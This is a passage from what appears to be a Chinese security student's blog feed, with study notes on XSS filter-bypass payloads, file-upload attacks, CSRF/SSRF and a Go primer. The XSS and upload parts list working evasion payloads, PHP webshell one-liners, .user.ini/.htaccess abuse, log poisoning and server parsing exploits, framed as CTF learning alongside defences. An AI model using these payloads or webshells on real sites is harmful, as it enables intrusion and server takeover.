class="line">onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure></li><li><p>过滤空格: 用&#x2F;代替空格</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt; </span><br></pre></td></tr></table></figure></li><li><p>关键字过滤:</p></li></ol><ul><li><p>大小写绕过:   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">ImG</span> sRc=x onerRor=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt; </span><br></pre></td></tr></table></figure></li><li><p>字符串拼接: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用eval</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用top</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>双写绕过: (有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;imimgg srsrcc=x onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure></li><li><p>编码绕过:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unicode编码</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">// url编码</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">// Ascii码绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br><span class="line"></span><br><span class="line">// hex绕过</span><br><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">// 八进制</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">// base64绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>过滤双引号，单引号:<br>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="title function_">alert</span>(<span class="string">`xss`</span>);&gt;</span><br></pre></td></tr></table></figure></li><li><p>过滤括号:(当括号被过滤的时候可以使用throw来绕过)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>参考:<a href="https://xz.aliyun.com/t/4067/?time__1311=eqjxg7GQoDqGqAK5GN9CDUO0G70QQQe+e4D&alichlgref=https://xz.aliyun.com/t/4067/#toc-4">https://xz.aliyun.com/t/4067/?time__1311=eqjxg7GQoDqGqAK5GN9CDUO0G70QQQe%2Be4D&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4067%2F#toc-4</a></p></li></ul><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h3 id="输入输出过滤"><a href="#输入输出过滤" class="headerlink" title="输入输出过滤"></a>输入输出过滤</h3><p>对用户的输入进行检查,输入内存长度限定,实体转义,对输出进行检查</p><h3 id="httponly设置"><a href="#httponly设置" class="headerlink" title="httponly设置"></a>httponly设置</h3><p><code>HttpOnly</code>是一个在 HTTP 响应头<code>Set-Cookie</code>里面的附加标志。它是一种安全标志，用于限制 Cookie 的访问权限。当一个 Cookie 的 HttpOnly 属性被设置为 true 时，这个 Cookie 只能通过服务器端进行修改，JavaScript 是无法访问和修改这个 Cookie 的。这样，浏览器将禁止 JavaScript 对该 Cookie 的访问。</p><p>tips: 在用BeEF去hook到了之后依旧可以拿到cookie,因为BeEF不是通过JS去获取Cookie,而是通过反向连接去获得</p><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p>CSP，全名为 Content Security Policy，也就是内容安全策略。它是一种由开发者定义的安全性政策性声明，旨在减少跨站脚本攻击（XSS）。</p><p>CSP 的工作原理是限制页面可以加载的资源和被其他页面框架的情况。要启用 CSP，响应需要包含一个 HTTP 响应头，该头使用包含策略的值调用。这个策略可以指定可信的内容来源，这里的内容可以指脚本、图片、iframe、字体、样式等等可能的远程的资源。</p><p>例如，你可以设置一个 CSP 策略，只允许从你自己的网站加载脚本，而不允许从其他任何网站加载脚本。这样，即使攻击者成功地将一个恶意脚本注入到你的网页中，这个脚本也无法被执行，因为它不符合你的 CSP 策略。</p><p>总的来说，CSP 是一种重要的 Web 安全机制，它可以帮助防止跨站脚本攻击（XSS）和其他一些攻击。通过正确地设置 CSP 策略，开发人员可以提高 Web 应用程序的安全性，并保护用户的隐私和敏感信息。</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传总结</title>
      <link href="/2024/03/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>后门代码必须用特定格式后缀解析,不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如: jpg图片里面有php后门代码,后门不能被解析,所以连接不上</p><p>webshell和其对应网站的开发语言:</p><ul><li>php      php马</li><li>asp      asp马 </li><li>.net     aspx马</li><li>java     jsp马</li></ul><h2 id="文件上传的检测-ctfshow"><a href="#文件上传的检测-ctfshow" class="headerlink" title="文件上传的检测(ctfshow)"></a>文件上传的检测(ctfshow)</h2><p>分为前端检测和后端检测 白名单策略和黑名单策略</p><h3 id="前端检测-前端代码可改-在本地删掉或者更改前端代码即可"><a href="#前端检测-前端代码可改-在本地删掉或者更改前端代码即可" class="headerlink" title="前端检测(前端代码可改,在本地删掉或者更改前端代码即可)"></a>前端检测(前端代码可改,在本地删掉或者更改前端代码即可)</h3><ul><li>检查文件后缀</li></ul><h3 id="后端检测-后端检查代码未知-只能去猜-可能是黑名单验证或者白名单验证"><a href="#后端检测-后端检查代码未知-只能去猜-可能是黑名单验证或者白名单验证" class="headerlink" title="后端检测(后端检查代码未知,只能去猜,可能是黑名单验证或者白名单验证)"></a>后端检测(后端检查代码未知,只能去猜,可能是黑名单验证或者白名单验证)</h3><h4 id="上传检测"><a href="#上传检测" class="headerlink" title="上传检测"></a>上传检测</h4><ul><li><p>文件后缀验证: 检查上传文件的后缀名是否合法</p><ol><li>可以通过可以试一下大小写绕过(windows),多后缀解析(上传php5,php7)</li><li>配置文件利用(<code>.user.ini</code>文件(nginx,apache)  <code>.htaccess</code>文件(apache,nginx默认不支持但是可以通过其他配置支持))  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.user.ini作用</span><br><span class="line">1. 防止跨目录访问和文件跨目录读取：.user.ini文件可以帮助防止非法用户访问或读取目录中的文件(只对此目录和子目录的php程序起作用)</span><br><span class="line">2. 文件包含：.user.ini文件中的auto_prepend_file和auto_append_file配置可以实现文件包含。auto_prepend_file配置项指定一个文件，该文件会在每个PHP脚本执行前被自动包含，类似于在文件前调用了require()函数。而auto_append_file配置项指定的文件会在每个PHP脚本执行后被自动包含</span><br><span class="line">3. 使用的条件:服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)</span><br><span class="line">总结一下:</span><br><span class="line">利用.user.ini文件需要同目录下 有以下三个文件</span><br><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg // 包含图片</span><br><span class="line">// 1.jpg</span><br><span class="line">&lt;?php eval(`$_GET[&#x27;cmd&#x27;]);?&gt;        // 后门代码</span><br><span class="line">// index.php(任意php文件,用来执行.user.ini)      </span><br></pre></td></tr></table></figure></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.htaccess作用</span><br><span class="line">    网站的配置文件 和.user.ini类似 可以通过更改解析规则来实现解析文件马</span><br><span class="line">利用:</span><br><span class="line">    先传入图片马</span><br><span class="line">    然后传入.htaccess文件,文件内容如下</span><br><span class="line">    AddType application/x-httpd-php .png</span><br><span class="line">    意思是将.png文件解析为php文件(.png可以替换为别的文件名)</span><br></pre></td></tr></table></figure></li><li><p>MIME类型验证: 在数据包的Content-Type字段中检查上传文件的类型</p></li><li><p>图片内容检测: 检查数据包中的图片内容是否合法,可以在数据包中慢慢删除一些数据,去测试检测点(然后再去看如何绕过)</p><ol><li><p>检查标签(比如检测&lt;?php ): 可以用短标签或者其他标签去绕过</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;? ?&gt;       // 需要开启短标签开关 short_open_tag</span><br><span class="line"></span><br><span class="line">&lt;?=         // 不需要闭合标签 要求：PHP版本&gt;PHP 5.4.0</span><br><span class="line"></span><br><span class="line">// asp标签</span><br><span class="line">&lt;%  %&gt;      //  要求开启asp_tags</span><br><span class="line"></span><br><span class="line">// js标签 php7后好像就不能用了</span><br><span class="line">&lt;script language=”php”&gt;system($_GET[&#x27;cmd&#x27;]); </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>文件头检验: 添加图片文件头绕过(一般用gif文件头GIF89a来绕过)</p></li><li><p>检查<code>[]</code>: 可以用()去绕过 如 <code>&lt;?php eval($_GET(&#39;cmd&#39;));?&gt;</code></p></li><li><p>检查<code>;</code>: 可以不写分号去绕过 如 <code>&lt;?=system(&#39;tac  ../fl*&#39;)?&gt;</code>   </p></li><li><p>检查<code>()</code>: 可以用反引号去绕过 如 <code>&lt;?=`tac ../f*`?&gt;</code></p></li><li><p>检查<code>.</code>: 可以用远程文件包含(<code>.user.ini</code>或者 <code>图片马</code>)去绕过,包含vps中的后门代码 IP 地址中的<code>.</code> 可以用ip转int类型去绕过 如 <code>&lt;?php include &#39;2130706433&#39;?&gt;</code></p></li><li><p>一些关键字被过滤了,可以用”.”去拼接 如log被过滤 可以用 lo”.”g去绕过</p></li><li><p>在所有的在请求体里面的绕过都无效的时候,可以试试尝试将payload写入UA头里面,因为服务器会有日志记录,所有我们可以将payload写入UA头里面,然后再通过.user.ini去包含图片马(图片马中要包含日志文件)来执行,如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">随便发送一个包UA头里面带payload</span><br><span class="line"></span><br><span class="line">// 图片马包含日志</span><br><span class="line">// nginx日志路径为:/var/log/nginx/access.log </span><br><span class="line">// apache日志路径为:/var/log/httpd/access_log</span><br><span class="line">&lt;?php include &quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br><span class="line">// &quot;&quot;和. 来拼接绕过log关键字</span><br><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg // 包含图片</span><br><span class="line"></span><br><span class="line">然后再访问该目录(会直接到该目录的php文件去执行)</span><br><span class="line">然后看到的就是日志文件了</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="上传后检测"><a href="#上传后检测" class="headerlink" title="上传后检测"></a>上传后检测</h4><ol><li>上传成功后检测文件,将文件删除<ul><li>什么都删除: 可以试试条件竞争(在上传成功的时候,立马访问,创建新后门)</li><li>检测到恶意文件删除: 免杀 条件竞争</li></ul></li><li>上传的文件更改(二次渲染)<ul><li>上传图片马 发现名字和之前上传之前的不一样 然后大小,尺寸属性也不一样 但是图片内容(二进制数据)有相似的地方<br>   此时需要用脚本生成特定的图片马,或者将恶意代码嵌入到相同图片内容的地方中间</li></ul><p>  <code>https://blog.csdn.net/qq_40800734/article/details/105920149</code></p></li></ol><h2 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h2><h3 id="IIS-version-x3D-6-0-通常为winserver-2003-7-0和7-5-通常为winserver-2008"><a href="#IIS-version-x3D-6-0-通常为winserver-2003-7-0和7-5-通常为winserver-2008" class="headerlink" title="IIS(version&#x3D;6.0(通常为winserver 2003),7.0和7.5(通常为winserver 2008))"></a>IIS(version&#x3D;6.0(通常为winserver 2003),7.0和7.5(通常为winserver 2008))</h3><ul><li>IIS6.0<ol><li>文件名: x.asp;x.jpg 就会将jpg解析成asp文件</li><li>目录名: x.asp&#x2F;x.jpg 就会将jpg解析成asp文件(这个需要更改webshell的上一级的目录名)</li></ol></li><li>Apache HTTPD 换行解析漏洞 apache(2.4.0~2.4.29)<ol><li><code>黑名单绕过</code>,如果是白名单策略可能不行: 如果开发者不以最后一个点为准去写白名单 <code>x.jpg.php%0A</code> 则可以绕过</li><li>在上传的时候更改<code>hex</code>(在php后缀后面加上<code>x0A</code>)实现绕过,然后访问<code>x.php%0A</code>就可以成功使服务器将<code>php%0A</code>文件执行为<code>php</code></li></ol></li><li>nginx<br>漏洞1:用户配置不当造成的解析漏洞<br>上传图片马后访问 然后在地址后面加上&#x2F;.php 即可成功执行php<br>漏洞2.文件名的逻辑漏洞(Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7)<br>上传图片马<code>1.gif </code> (注意gif后面的空格),后访问<code>http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php</code> 即可发现php已经被执行</li><li>IIS 7.0&#x2F;IIS 7.5<br>它的解析漏洞和nginx的漏洞1一样</li></ul><h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><p>  看编辑器的类型和版本,然后去搜漏洞利用</p><h1 id="文件上传的黑盒和白盒"><a href="#文件上传的黑盒和白盒" class="headerlink" title="文件上传的黑盒和白盒"></a>文件上传的黑盒和白盒</h1><h2 id="黑盒-寻找一切存在文件上传的功能和应用"><a href="#黑盒-寻找一切存在文件上传的功能和应用" class="headerlink" title="黑盒: 寻找一切存在文件上传的功能和应用"></a>黑盒: 寻找一切存在文件上传的功能和应用</h2><ol><li>个人用户中心是否存在文件上传功能</li><li>后台管理系统是否存在文件上传功能</li><li>字典目录扫描探针文件上传构造地址</li><li>字典目录扫描探针编辑器目录构造地址</li></ol><h2 id="白盒-看三点-中间件-编辑器-功能代码"><a href="#白盒-看三点-中间件-编辑器-功能代码" class="headerlink" title="白盒: 看三点 中间件 编辑器 功能代码"></a>白盒: 看三点 中间件 编辑器 功能代码</h2><ol><li>中间件直接看语言环境常用搭配</li><li>编辑器直接看目录结构或搜索关键字</li><li>功能代码直接看源码应用或搜索关键字</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF&amp;SSRF总结</title>
      <link href="/2024/03/01/CSRF-SSRF%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/01/CSRF-SSRF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）利用用户已经认证过的会话信息来伪造用户的请求，从而在用户不知情的情况下执行恶意操作。这种攻击可能导致用户在未经授权的情况下执行操作，比如更改账户设置、发布内容等</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>用户已经登录了网站,并且能够执行网站的功能</li><li>目标用户访问了攻击者构造的URL</li></ol><h2 id="黑盒下判断CSRF"><a href="#黑盒下判断CSRF" class="headerlink" title="黑盒下判断CSRF"></a>黑盒下判断CSRF</h2><ol><li>检查请求的来源(可以直接访问需要登录的URL看看有没有同源策略检测Referer头)</li><li>凭据里面有无token(每次操作需要对的token,并且每次操作后token都会更新)</li><li>关键操作是否有验证(验证码验证)</li></ol><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF（Server-Side Request Forgery，服务端请求伪造），攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源。SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造</p><h2 id="SSRF黑盒下可能出现的地方"><a href="#SSRF黑盒下可能出现的地方" class="headerlink" title="SSRF黑盒下可能出现的地方"></a>SSRF黑盒下可能出现的地方</h2><ol><li>社交分享: 获取超链接的标题等内容进行展示</li><li>转码服务: 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译: 给网址翻译对应网页内容</li><li>图片加载与下载: 富文本编辑器中的点击下载图片到本地,获取图片URL地址进行加载或者下载图片</li><li>图片文章收藏功能: 主要会取其URL地址中的title以及文本的内容来追求好的用户体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比mongodb的copyDatabase数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理，属性信息处理，文件处理：比ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞<br>一些的ur中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、 domain等</li></ol><h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><ol><li>http协议内网探针(扫描内网)</li><li>file协议读取服务器的敏感文件</li></ol><h2 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h2><ol><li>禁用跳转</li><li>禁用不需要的协议</li><li>固定或者限制资源地址</li><li>错误信息统一信息处理</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探go</title>
      <link href="/2024/01/04/%E5%88%9D%E6%8E%A2go/"/>
      <url>/2024/01/04/%E5%88%9D%E6%8E%A2go/</url>
      
        <content type="html"><![CDATA[<h1 id="go语言的基本概念"><a href="#go语言的基本概念" class="headerlink" title="go语言的基本概念"></a>go语言的基本概念</h1><h2 id="1-go语言的特性"><a href="#1-go语言的特性" class="headerlink" title="1. go语言的特性"></a>1. go语言的特性</h2><ul><li>编译型语言 : 先编译再运行(go build),和C一样的特性,速度快(优于java和python这种解释型语言，java先编译后解释再运行，python解释然后运行) </li><li>垃圾回收 : 自动回收垃圾(不需要手动释放内存),和 java 一样 </li><li>异常处理 : 没有try…catch,用返回值的形式来判断错误</li><li>交叉编译 : 可以在不同平台编译(windows,linux,mac),完全支持UTF-8编码</li><li>高并发 : 支持高并发(goroutine),很多情况下不需要考虑锁机制带来的问题(channel)</li><li>网络编程方便 : 自带了网络编程的接口</li><li>短语法: 自动变量类型判断(:&#x3D;),函数简化(func),访问权限机制由标识符(函数名,变量名,常量名)的首字母大小写来决定(大写public,小写private) </li><li>语言交互性 : go 由 C 语言开发,可以调用c语言(cgo)</li></ul><h2 id="2-go的一些概念"><a href="#2-go的一些概念" class="headerlink" title="2. go的一些概念"></a>2. go的一些概念</h2><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><ul><li>GOROOT : go的安装目录</li><li>GOPATH : 工作目录,包含三个子目录 : bin,pkg,src</li><li>GOBIN : 编译后二进制文件的存放路径</li><li>GO111MODULE : 是否开启go mod模式(1.11版本后默认开启)</li><li>GOARCH : 目标平台的架构(amd64,arm)</li><li>GOPROXY : Go 的代理设置，用于下载 Go 的第三方包</li></ul><h3 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h3><ul><li>go build : 编译go文件,生成可执行文件</li><li>go run : 编译并运行go文件</li><li>go install : 编译并安装包及其依赖项</li><li>go get：动态获取远程代码包及其依赖包，并进行编译和安装</li><li>go mod：用于模块维护，包括初始化模块、添加和更新依赖项等</li><li>go clean：删除编译生成的对象文件和缓存文件</li><li>go fmt：使用 gofmt 重新格式化 Go 包的源代码</li><li>go list：列出包或模块的信息</li><li>go version：打印 Go 的版本信息</li><li>go env：打印 Go 的环境信息</li></ul><h2 id="3-go语言的语法"><a href="#3-go语言的语法" class="headerlink" title="3. go语言的语法"></a>3. go语言的语法</h2><h3 id="书写规范"><a href="#书写规范" class="headerlink" title="书写规范"></a>书写规范</h3><ul><li>命名规范:<br>  Go 在命名时以字母或下划线开头，后面跟着零或更多的字母、下划线和数字<br>  Go 不允许在命名时中使用 @、$ 和 % 等标点符号<br>  Go 是一种区分大小写的编程语言,命名以一个大写字母开头,如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用</li><li>代码风格：<br>  Go 语言的代码风格应该简洁、清晰。<br>  Go 语言鼓励使用简短的变量名，尤其是在函数的局部变量。</li></ul><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><ul><li><p>基本类型和java还是有挺多不同的,如下</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bool</span><br><span class="line">string</span><br><span class="line">int  int8  int16  int32  int64 </span><br><span class="line">uint uint8 uint16 uint32 uint64 uintptr 无符号</span><br><span class="line">byte // uint8 的别名</span><br><span class="line"></span><br><span class="line">rune // int32 的别名 类似于java中的char类型</span><br><span class="line">    // 表示一个 Unicode 码点</span><br><span class="line"></span><br><span class="line">float32 float64 浮点数类型(C中的float和double)</span><br><span class="line"></span><br><span class="line">complex64 complex128 // 复数类型(在math包中)</span><br></pre></td></tr></table></figure><p>  他们的零值:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数值类型为:0</span><br><span class="line">布尔类型为:false</span><br><span class="line">字符串为(空字符串):&quot;&quot;</span><br><span class="line">// go中没有null的概念</span><br><span class="line">指针、切片、映射、通道、函数和接口等引用类型的零值则是nil</span><br></pre></td></tr></table></figure></li><li><p>变量和常量:<br>  go中常量声明用<code>const</code>,变量声明用<code>var</code>或者<code>:=</code>(短变量声明,在函数体内,不能用于全局变量的声明);</p></li></ul><h3 id="导入包-目录"><a href="#导入包-目录" class="headerlink" title="导入包(目录)"></a>导入包(目录)</h3><p>go导入包步骤: 先去<code>$GOROOT</code>下查找,再去<code>$GOPATH</code>下查找</p><p>go导入包 一般用<code>import</code>关键字,如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>   <span class="comment">// 单行导入</span></span><br><span class="line"><span class="keyword">import</span> (       <span class="comment">// 多行导入</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span> </span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span> </span><br><span class="line">)</span><br><span class="line"><span class="comment">// 当我们导入了两个具有同一包名的包时产生冲突，可以定义别名</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line">    mrand <span class="string">&quot;math/rand&quot;</span> <span class="comment">// 将名称替换为mrand避免冲突</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><p>go中打印使用<code>fmt</code>包,最常用的是<code>Printf</code>和<code>Println</code><br>Printf支持格式化的字符串(在字符串中添加格式说明符如%T,像c语言的printf一样)<br>Println会自动在末尾添加换行符(和java的System.out.println差不多,只是拼接字符串和变量用的符号不同,java中用的是<code>+</code>,而go中是<code>,</code>)<br>如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> c = <span class="number">-5</span> + <span class="number">12i</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;Type=%T\n&quot;</span>, c)</span><br><span class="line">fmt.Println(<span class="string">&quot;Type=%T&quot;</span>, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go中的格式说明符:</p><figure class="highlight 